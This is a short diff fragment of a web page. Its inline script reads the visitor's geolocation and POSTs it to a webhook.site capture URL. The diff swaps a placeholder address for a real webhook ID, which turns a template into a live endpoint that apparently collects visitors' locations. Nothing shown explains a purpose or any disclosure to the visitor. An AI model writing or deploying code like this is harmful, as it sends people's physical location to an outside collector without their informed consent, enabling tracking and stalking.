@@ -10,7 +10,7 @@
   <script>
     navigator.geolocation.getCurrentPosition(
       position => {
-        fetch("https://webhook.site/your-unique-url", {
+        fetch("https://webhook.site/41629404-ed6f-4ff7-b77e-d5f3dd467669", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
